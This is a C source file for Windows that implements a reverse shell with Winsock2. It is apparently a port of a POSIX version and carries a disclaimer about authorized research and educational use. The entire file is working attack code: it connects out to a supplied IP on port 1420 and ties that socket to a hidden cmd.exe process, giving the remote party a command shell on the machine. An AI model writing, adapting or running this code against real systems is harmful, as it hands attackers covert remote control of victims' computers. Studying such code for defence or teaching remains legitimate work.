/**
 * ReverseShell_win.c — Windows Winsock2 implementation
 *
 * Equivalent of ReverseShell.c using Windows APIs instead of POSIX.
 * Cross-compiled with MinGW (x86_64-w64-mingw32-gcc).
 * Links against -lws2_32 (Winsock2) and -lkernel32.
 *
 * For authorized security research and educational use only.
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

void reverse_shell(char* ip) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in sin;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    /* Initialize Winsock (1) */
    WSAStartup(MAKEWORD(2, 2), &wsa);

    /* Create a TCP socket (2) */
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    /* Setup the connection structure (3) */
    sin.sin_family = AF_INET;
    sin.sin_port = htons(1420);
    inet_pton(AF_INET, ip, &sin.sin_addr);

    /* Connect to the remote host (4) */
    connect(sock, (struct sockaddr *)&sin, sizeof(sin));

    /* Setup STARTUPINFO to redirect stdin/stdout/stderr to socket (5) */
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    /* Create cmd.exe process with redirected handles (6) */
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE,
                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);

    /* Cleanup */
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
}

int main(int argc, char *argv[]) {
    char ip[15] = "127.0.0.1";
    if (argc > 1) {
        strncpy(ip, argv[1], sizeof(ip) - 1);
    }
    reverse_shell(ip);
    return 0;
}
